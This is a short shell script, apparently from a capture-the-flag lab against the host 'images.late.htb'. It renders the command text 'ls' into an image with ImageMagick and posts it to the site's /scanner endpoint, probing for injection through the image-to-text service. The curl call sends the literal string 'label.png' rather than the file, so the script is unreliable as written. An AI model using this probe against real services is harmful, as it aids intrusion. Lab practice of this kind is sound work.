URL="http://images.late.htb"
TEXT=`cat <<EOF
ls
EOF
`
echo $TEXT
convert -font Candice -pointsize 72 label:"$TEXT" label.png

curl -i -H "Content-Type: multipart/form-data" --data "label.png" -v -X POST $URL/scanner